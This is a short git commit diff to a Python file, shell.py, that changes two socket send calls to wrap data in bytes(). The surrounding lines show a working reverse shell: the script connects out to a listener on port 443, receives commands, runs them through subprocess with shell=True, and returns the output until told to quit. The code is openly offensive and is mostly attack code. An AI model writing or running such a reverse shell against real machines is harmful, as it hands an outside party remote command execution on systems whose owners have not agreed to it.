4f9d01df7520aaae0a45fb77abbe2d05a2de532c
Stephen Harris <trackmastersteve@users.noreply.github.com>
2018-09-05 21:05:47 -0700

    Update shell.py

--- shell.py
+++ shell.py
@@ -8,14 +8,14 @@ PORT = 443 # The same port as listener.
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT)) # Connect to listener.
-s.send('[*] Connection Established!') # Send connection confirmation.
+s.send(bytes('[*] Connection Established!')) # Send connection confirmation.
 
 while 1: # Start loop.
     data = s.recv(1024) # Recieve shell command.
     # Run shell command.
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
     stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
-    s.send(stdout_value) # Send output to listener.
+    s.send(bytes(stdout_value)) # Send output to listener.
     if data == "quit": 
         break # If its quit, then break out and close socket.
 s.close() # Close socket.
